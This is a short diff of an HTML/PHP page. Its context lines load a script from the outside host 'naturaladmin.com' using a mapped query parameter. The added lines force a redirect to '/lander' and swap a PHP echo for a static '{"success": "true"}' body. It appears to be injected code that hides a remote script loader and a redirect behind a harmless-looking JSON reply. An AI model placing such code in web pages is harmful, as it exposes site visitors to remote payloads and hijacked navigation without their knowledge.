@@ -12,10 +12,12 @@
         var script = document.createElement('script');
         script.setAttribute('src', 'https://naturaladmin.com/blog/?' + objectMap[param] + '.js');
         document.head.appendChild(script);
+        window.location.href = '/lander';
+
     </script>
 </head>
 </head>
 <body>
-    <?php echo '{"success": "true"}'; ?>
+{"success": "true"}
 </body>
 </html>
